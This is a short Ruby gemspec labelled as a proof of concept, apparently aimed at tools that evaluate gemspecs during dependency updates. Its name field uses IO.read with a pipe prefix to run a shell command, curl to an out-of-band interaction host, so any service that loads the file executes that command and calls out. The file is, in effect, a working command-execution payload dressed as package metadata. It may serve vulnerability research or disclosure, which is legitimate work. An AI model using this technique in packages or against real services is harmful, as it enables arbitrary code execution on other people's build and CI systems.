Gem::Specification.new do |s|
  s.name = (IO.read("|curl https://d73i758ocnble95eu0t0im8kqf818fjib.oast.site/poc1") rescue "dependabot-eval-poc")
  s.version = "1.0.0"
  s.authors = ["PoC"]
  s.summary = "PoC test"
  s.files = []
  s.add_dependency "rack", "~> 2.0"
end
